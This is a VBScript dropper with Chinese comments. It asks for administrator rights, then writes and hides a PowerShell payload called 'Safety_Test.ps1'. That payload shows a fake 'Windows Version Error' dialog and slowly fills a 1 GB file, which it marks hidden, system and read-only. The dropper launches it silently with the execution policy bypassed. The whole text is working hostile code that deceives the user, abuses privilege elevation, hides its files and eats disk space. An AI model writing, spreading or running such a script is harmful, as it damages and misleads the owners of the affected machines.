' --- 1. 自动请求管理员权限 ---
Set objShell = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevate") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' --- 2. 动态获取路径 ---
CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
psPath = CurrentDir & "\Safety_Test.ps1"

' --- 3. 关键修复：解除旧文件的属性锁定 ---
If fso.FileExists(psPath) Then
    Set oldFile = fso.GetFile(psPath)
    oldFile.Attributes = 0 ' 设为“普通”模式，以便覆盖
End If

' --- 4. 写入载荷内容 ---
Set psFile = fso.CreateTextFile(psPath, True) ' True 代表允许覆盖
psFile.WriteLine "$TargetDir = " & Chr(34) & CurrentDir & Chr(34)
psFile.WriteLine "$BigFile = Join-Path $TargetDir " & Chr(34) & "core_dump.txt" & Chr(34)

' 写入之前同样的膨胀逻辑
psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
psFile.WriteLine "$Popup = [powershell]::Create().AddScript({ [System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16) })"
psFile.WriteLine "$null = $Popup.BeginInvoke()"
psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
psFile.WriteLine "for($i=1; $i -le 1024; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 55 }"
psFile.WriteLine "$Stream.Close()"
psFile.WriteLine "attrib +h +s +r $BigFile"
psFile.Close

' --- 5. 再次深度隐藏脚本 ---
Set f = fso.GetFile(psPath)
f.Attributes = 2 + 4

' --- 6. 静默启动 ---
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
